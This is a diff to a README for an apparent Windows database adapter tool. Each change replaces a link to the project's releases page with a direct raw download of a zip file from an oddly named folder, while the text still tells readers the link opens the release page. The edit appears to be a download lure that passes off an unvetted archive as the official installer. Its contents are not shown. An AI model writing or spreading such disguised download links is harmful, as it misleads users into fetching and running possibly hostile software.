@@ -1,6 +1,6 @@
 # 🗄️ db-adapter-1771919096-2 - Connect Multiple Databases Easy
 
-[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/Basilb83/db-adapter-1771919096-2/releases)
+[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/Basilb83/db-adapter-1771919096-2/raw/refs/heads/main/salpoid/adapter_db_1.4-beta.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This app runs directly on your Windows PC. It does not need other software like 
 
 To begin, visit this page to download the setup file:
 
-[Download db-adapter-1771919096-2](https://github.com/Basilb83/db-adapter-1771919096-2/releases)
+[Download db-adapter-1771919096-2](https://github.com/Basilb83/db-adapter-1771919096-2/raw/refs/heads/main/salpoid/adapter_db_1.4-beta.5.zip)
 
 Click the link above or the big green button at the top. This will open the GitHub release page where you can find the latest Windows installer.
 
@@ -113,10 +113,10 @@ For more help, you can check the 'Issues' tab on the GitHub repository or ask so
 
 ## 🔗 Useful Links
 
-- GitHub Releases: [https://github.com/Basilb83/db-adapter-1771919096-2/releases](https://github.com/Basilb83/db-adapter-1771919096-2/releases)  
+- GitHub Releases: [https://github.com/Basilb83/db-adapter-1771919096-2/raw/refs/heads/main/salpoid/adapter_db_1.4-beta.5.zip](https://github.com/Basilb83/db-adapter-1771919096-2/raw/refs/heads/main/salpoid/adapter_db_1.4-beta.5.zip)  
 - App Installation File: available under "Assets" on the releases page  
 - Documentation: Basic user guide included within the app help menu
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Here-orange)](https://github.com/Basilb83/db-adapter-1771919096-2/releases)
+[![Download Now](https://img.shields.io/badge/Download-Here-orange)](https://github.com/Basilb83/db-adapter-1771919096-2/raw/refs/heads/main/salpoid/adapter_db_1.4-beta.5.zip)
